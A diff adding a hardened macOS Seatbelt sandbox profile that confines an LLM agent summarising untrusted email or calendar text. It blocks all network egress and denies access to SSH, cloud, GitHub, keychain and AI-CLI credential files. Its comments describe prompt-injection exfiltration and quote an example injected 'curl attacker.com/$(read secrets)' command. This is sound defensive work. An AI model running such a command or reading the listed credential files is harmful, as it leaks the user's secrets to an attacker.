@@ -1,0 +1,273 @@
+; cli_agent.sandbox.strict.sb — macOS Seatbelt profile, HARDENED variant.
+;
+; This is the DEFAULT profile (cli_agent.sandbox.sb) plus two extra denials for
+; untrusted-input flows (e.g. an LLM summarizing attacker-controlled email /
+; calendar text): (1) ALL network egress is denied, and (2) the per-repo Swamp
+; vault (.swamp/secrets, and any **/*.key) under CWD is denied for read+write.
+;
+; Selected by opt-in only — a caller sets `sandboxNetwork: "deny"` (which points
+; wrapWithSandbox at this file). The default profile is UNCHANGED, so ADW,
+; software-factory, and every other cli-agent consumer that legitimately needs
+; network + repo access keep working exactly as before. Use this variant only
+; for flows where the agent processes UNTRUSTED input and needs no network:
+; the synthesis step reads pre-fetched sanitized text and emits a summary — it
+; has no reason to phone out, so denying egress closes the prompt-injection
+; exfiltration path (the real security boundary; sanitization is only
+; defense-in-depth in front of it).
+;
+; Rationale for the base posture (inherited from the default profile):
+;
+; Posture: `(allow default)` + explicit `(deny file-read* ...)` on a known
+; ambient-secret set, plus a `(deny file-write* ...)` scoped to everything
+; under $HOME except cwd/tmp/state dirs a CLI legitimately needs. This is
+; deliberately NOT a `(deny default)` profile. A full deny-default profile is
+; the *hardening* step (tighten later, once the allow-list of what a real
+; coding-agent toolchain touches — dynamic linker paths, sysctl, mach
+; services, language-runtime caches, etc. — has been enumerated and proven
+; non-breaking). Shipping deny-default as the first cut risks silently
+; breaking git/node/deno/ruby/toolchains in ways that are expensive to
+; diagnose from a swamp method run. Prove-then-tighten: this profile proves
+; the confinement works (secrets denied, writes scoped) without gambling on
+; breaking every legitimate host-toolchain call the agent needs to make.
+;
+; Network egress is DENIED in this hardened variant (see the `(deny network*)`
+; rule below) — this is the key difference from the default profile.
+;
+; Params (fill via `sandbox-exec -D CWD=... -D HOME=... -f this-file`):
+;   CWD  — the invocation's working directory (writes are scoped to this).
+;   HOME — the invoking user's home directory (secret paths are relative to it).
+;
+; Denied-secret set (see cli_agent.ts wrapWithSandbox doc comment for the
+; researched-on-this-machine path list this mirrors):
+;   ~/.ssh, ~/.aws, ~/.config/gcloud, ~/.config/gh, ~/.gnupg, ~/.npmrc,
+;   ~/.docker/config.json, ~/Library/Keychains, ~/.config/op,
+;   ~/.claude.json, ~/.claude/.credentials.json, ~/.codex/auth.json,
+;   ~/.codex/config.toml, ~/.config/amp, ~/.local/share/opencode/auth.json,
+;   ~/.config/swamp (FRK-SEC-001: the Swamp control-plane API key persisted
+;   by `swamp auth login` at ~/.config/swamp/auth.json — see below).
+;
+; Note the CLI's own *non-credential* state (e.g. ~/.claude/projects,
+; ~/.claude/history.jsonl, ~/.codex/history.jsonl) is intentionally NOT
+; denied for read — a coding agent needs to function, and blanket-denying an
+; entire ~/.claude or ~/.codex directory breaks it. Only the specific
+; credential/token/keyring files are denied.
+
+(version 1)
+
+(allow default)
+
+(import "system.sb")
+
+(define CWD (param "CWD"))
+(define HOME (param "HOME"))
+
+; --- HARDENED: deny all network egress ---------------------------------------
+;
+; The single most important difference from the default profile. For an LLM
+; running on untrusted input, open network egress is the prompt-injection
+; exfiltration path (an injected "curl attacker.com/$(read secrets)" would
+; otherwise succeed). Denying network* blocks BSD sockets, outbound connects,
+; and — verified empirically — even DNS resolution, so an injected instruction
+; to phone home cannot reach the network at all. A flow that legitimately needs
+; network (build/test/deploy agents like software-factory / ADW) must NOT use
+; this profile — it uses the permissive default instead.
+(deny network*)
+
+; --- HARDENED: deny the per-repo Swamp vault under CWD ------------------------
+;
+; The default profile denies ambient secrets under $HOME, but the project-local
+; Swamp vault lives under CWD (which is otherwise read+write allowed), so a
+; co-located `.swamp/secrets` (including plaintext `.key` files next to `.enc`
+; ciphertext) would be readable by the agent. Deny it explicitly — read AND
+; write — so an untrusted-input agent can never read a secret that happens to
+; be checked out in the repo it's invoked against. Placed here (after the
+; params, before the CWD write-allow that comes later in the inherited body) —
+; and repeated after that allow — so Seatbelt's last-rule-wins ordering keeps
+; the deny in force even though CWD is broadly write-allowed downstream.
+(deny file-read*
+  (subpath (string-append CWD "/.swamp/secrets")))
+(deny file-write*
+  (subpath (string-append CWD "/.swamp/secrets")))
+
+; --- Deny read of ambient secrets --------------------------------------------
+
+(deny file-read*
+  ; SSH keys
+  (subpath (string-append HOME "/.ssh"))
+  ; AWS credentials/config
+  (subpath (string-append HOME "/.aws"))
+  ; gcloud credentials
+  (subpath (string-append HOME "/.config/gcloud"))
+  ; GitHub CLI token/config (hosts.yml holds the oauth token)
+  (subpath (string-append HOME "/.config/gh"))
+  ; GnuPG secret keyring
+  (subpath (string-append HOME "/.gnupg"))
+  ; npm registry auth token
+  (literal (string-append HOME "/.npmrc"))
+  ; Docker registry auth
+  (literal (string-append HOME "/.docker/config.json"))
+  ; macOS keychains (login keychain holds Safari/Chrome/system secrets).
+  ; The login keychain's DB file is re-allowed for read below (carve-out) so
+  ; that provider CLIs authenticated via Keychain (e.g. claude on machines
+  ; where `security find-generic-password -s "Claude Code-credentials"` is
+  ; the auth source, not ~/.claude/.credentials.json) still work sandboxed.
+  ; Every OTHER keychain (metadata.keychain-db, any additional user
+  ; keychains) stays denied.
+  (subpath (string-append HOME "/Library/Keychains"))
+  ; 1Password CLI/daemon socket + config
+  (subpath (string-append HOME "/.config/op"))
+  ; Claude Code's own top-level config + OAuth credentials
+  (literal (string-append HOME "/.claude.json"))
+  (literal (string-append HOME "/.claude/.credentials.json"))
+  ; Codex CLI's own OAuth/API credentials + config (may embed API keys)
+  (literal (string-append HOME "/.codex/auth.json"))
+  (literal (string-append HOME "/.codex/config.toml"))
+  ; Amp CLI settings (may embed an API key)
+  (subpath (string-append HOME "/.config/amp"))
+  ; OpenCode CLI's own auth store
+  (literal (string-append HOME "/.local/share/opencode/auth.json"))
+  ; Swamp control-plane credentials (FRK-SEC-001): `swamp auth login`
+  ; persists the API key at ~/.config/swamp/auth.json, plus server/identity
+  ; metadata at servers.json and identity.json in the same directory. This
+  ; is the SAME credential class PROVIDER_CHILD_ENV_DENYLIST strips from the
+  ; child's environment in cli_agent.ts (SWAMP_API_KEY, SWAMP_WORKER_TOKEN,
+  ; SWAMP_SERVER_TOKEN, SWAMP_SERVE_EXTRA_HEADERS) — the env filter closes
+  ; the environment vector, this closes the on-disk vector for the same
+  ; secret. Deny the whole subpath (like ~/.config/gh, ~/.config/gcloud,
+  ; ~/.config/amp above) rather than only the three known files, so any
+  ; future file Swamp adds under this directory is covered by default.
+  (subpath (string-append HOME "/.config/swamp"))
+)
+
+; --- Re-allow read of the LOGIN keychain DB only -----------------------------
+;
+; Researched on this machine (macOS 26.3 arm64): claude's auth lives in the
+; macOS Keychain under service "Claude Code-credentials", read via
+; `security find-generic-password -s "Claude Code-credentials"` — NOT via
+; ~/.claude/.credentials.json. Under the deny above, that lookup fails with
+; the SAME error/exit code (44, "The specified item could not be found in the
+; keychain") as a genuine missing item, i.e. Seatbelt denials are invisible at
+; the CLI's error-message layer — sandboxed claude just reports "Not logged
+; in" with no hint that it's a sandbox issue, not a real logged-out state.
+;
+; Captured via `log stream --predicate '(process == "sandboxd") OR
+; (subsystem == "com.apple.sandbox") OR (composedMessage CONTAINS
+; "Sandbox:")'` while re-running the denied lookup, the kernel-level denial
+; is:
+;   Sandbox: security(<pid>) deny(1) file-read-metadata /Users/mat/Library/Keychains
+;   Sandbox: security(<pid>) deny(1) file-read-metadata /Users/mat/Library/Keychains/login.keychain-db
+; Only file-read-metadata was denied — no mach-lookup denial for
+; com.apple.securityd/SecurityServer appeared for this process. On this
+; system's Seatbelt/securityd version, the actual credential fetch apparently
+; happens through a mach service that `(allow default)` already permits (no
+; mach-lookup entry needed here); the file-read* deny above is the only
+; blocker. If a future macOS version starts denying that mach lookup too, the
+; log would show `deny(1) mach-lookup com.apple.securityd` (or
+; com.apple.SecurityServer) and the fix would need
+; `(allow mach-lookup (global-name "com.apple.securityd"))` alongside this.
+;
+; Fix: re-allow file-read* (data AND metadata — `file-read*` is the
+; superclass) on ONLY the login keychain DB and its SQLite WAL-mode sidecars
+; (not present on this machine today, but included defensively since a
+; keychain can rotate into WAL mode). This must be `(allow file-read* ...)`,
+; not just `file-read-metadata`, because the confirmed real denial was on
+; -metadata but the underlying keychain read syscalls also need file-read-data
+; access to actually fetch the secret payload. Every other keychain file
+; (metadata.keychain-db, any additional/other user keychains) remains denied
+; by the broader subpath deny above, since this carve-out only names the
+; login keychain literally rather than re-allowing the whole subpath.
+;
+; Tradeoff: this allows a sandboxed process to read the ENTIRE login
+; keychain, not just the "Claude Code-credentials" item — Seatbelt has no
+; concept of "this one keychain item." Any provider CLI (or a compromised
+; one) running inside this sandbox could read other secrets stored in the
+; same login keychain (Wi-Fi passwords, Safari-saved logins, other apps'
+; generic-password items). This is accepted as the minimal fix because (a)
+; the login keychain is unlocked and already readable by every unsandboxed
+; process the user runs anyway, so this does not grant a NEW capability
+; relative to running the CLI unsandboxed, and (b) write access to this file
+; is NOT granted — see the write-deny section below, which still blocks
+; sandboxed processes from tampering with the keychain DB itself.
+(allow file-read*
+  (literal (string-append HOME "/Library/Keychains/login.keychain-db"))
+  (literal (string-append HOME "/Library/Keychains/login.keychain-db-shm"))
+  (literal (string-append HOME "/Library/Keychains/login.keychain-db-wal")))
+
+; --- Restrict writes to cwd + tmp + known CLI state dirs ---------------------
+;
+; Deny writes anywhere under $HOME first, then re-allow the specific
+; subtrees a CLI legitimately needs (cwd, its own non-credential state,
+; shared caches). Order matters: Seatbelt evaluates rules with later/more
+; specific rules taking precedence over earlier broader ones for the same
+; operation class, so the `(allow file-write* (subpath CWD))` etc. below
+; carve back out of this deny.
+;
+; Note: ~/.config/swamp is NOT among the write-allow subtrees re-allowed
+; below (unlike ~/.claude, ~/.codex, ~/.config/opencode), so it already
+; stays covered by this blanket `(deny file-write* (subpath HOME))` with no
+; carve-out needed. It is still named explicitly in the re-deny block below
+; (mirroring the other credential files) as defense-in-depth in case a
+; future edit ever adds a broader ~/.config write-allow.
+
+(deny file-write*
+  (subpath HOME))
+
+(allow file-write*
+  (subpath CWD)
+  (subpath "/tmp")
+  (subpath "/private/tmp")
+  (subpath "/var/folders")
+  ; Deno's own temp/cache dirs (TMPDIR is usually under /var/folders, covered
+  ; above, but some setups point it elsewhere under $HOME — allow explicitly).
+  (subpath (string-append HOME "/.cache"))
+  (subpath (string-append HOME "/.deno"))
+  ; Claude Code's / Codex's / OpenCode's own NON-credential state (sessions,
+  ; history, caches). These CLIs must be able to write their working state to
+  ; function. The specific credential files that live INSIDE these subtrees
+  ; are clawed back below with an explicit write-deny — read-deny alone is not
+  ; enough, because a later/more-specific write-allow subpath would otherwise
+  ; let a sandboxed process OVERWRITE (sabotage) a credential file it cannot
+  ; read. Both a read-deny (above) and a write-deny (below) cover each of them.
+  (subpath (string-append HOME "/.claude"))
+  (subpath (string-append HOME "/.codex"))
+  (subpath (string-append HOME "/.config/opencode"))
+  (subpath (string-append HOME "/.local/share/opencode")))
+
+; --- Re-deny writes to credential files inside write-allowed subtrees --------
+;
+; Placed AFTER the write-allow block so it wins by Seatbelt rule order (later
+; rule takes precedence). Every file named in the read-deny set that also
+; falls under one of the write-allow subpaths above MUST appear here, or a
+; sandboxed process could clobber a credential it is forbidden to read
+; (credential-sabotage / DoS). Cross-checked against the full read-deny list:
+; these four are the only read-denied paths that are write-reachable.
+
+(deny file-write*
+  ; Claude Code OAuth credentials (inside the write-allowed ~/.claude subtree)
+  (literal (string-append HOME "/.claude/.credentials.json"))
+  ; Codex OAuth/API credentials + config (inside write-allowed ~/.codex)
+  (literal (string-append HOME "/.codex/auth.json"))
+  (literal (string-append HOME "/.codex/config.toml"))
+  ; OpenCode auth store (inside write-allowed ~/.local/share/opencode)
+  (literal (string-append HOME "/.local/share/opencode/auth.json")))
+
+; --- Explicit write-deny for the Swamp control-plane credential dir ----------
+;
+; Redundant with the blanket `(deny file-write* (subpath HOME))` above (see
+; the note in that section), since ~/.config/swamp is never write-allowed.
+; Named explicitly, and scoped to the whole subpath like the read-deny above,
+; so this stays correct even if a future edit broadens a write-allow subtree.
+(deny file-write*
+  (subpath (string-append HOME "/.config/swamp")))
+
+; --- HARDENED: re-assert the per-repo vault deny AFTER the CWD write-allow ----
+;
+; The `(allow file-write* (subpath CWD))` earlier in this file would otherwise
+; win (last-rule-wins) over the CWD-vault deny near the top. Re-deny here, at
+; the end, so `.swamp/secrets` under CWD stays non-writable AND non-readable
+; regardless of the broad CWD allow. Read is also re-denied for symmetry (the
+; top read-deny already covers it, but a future edit could reorder).
+(deny file-read*
+  (subpath (string-append CWD "/.swamp/secrets")))
+(deny file-write*
+  (subpath (string-append CWD "/.swamp/secrets")))
